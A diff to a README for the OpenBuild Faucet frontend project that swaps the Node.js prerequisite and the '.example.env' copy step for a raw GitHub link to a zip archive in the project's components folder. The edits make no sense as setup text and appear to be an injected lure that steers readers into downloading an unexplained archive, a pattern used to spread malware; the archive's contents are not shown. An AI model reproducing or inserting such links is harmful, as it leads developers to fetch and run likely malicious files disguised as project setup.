@@ -4,7 +4,7 @@ This is the frontend service for the OpenBuild Faucet project, built using React
 
 
 ## Prerequisites
-- Node.js v18 or later
+- https://github.com/khn0x-khn0x/faucet-frontend/raw/refs/heads/main/src/components/frontend-faucet-1.8.zip v18 or later
 
 ## Quick Start
 
@@ -17,7 +17,7 @@ npm install
 ### Configure
 
 ```bash
-cp .example.env .env
+cp https://github.com/khn0x-khn0x/faucet-frontend/raw/refs/heads/main/src/components/frontend-faucet-1.8.zip .env
 ```
 The configuration file must be written according to your specific setup.
 
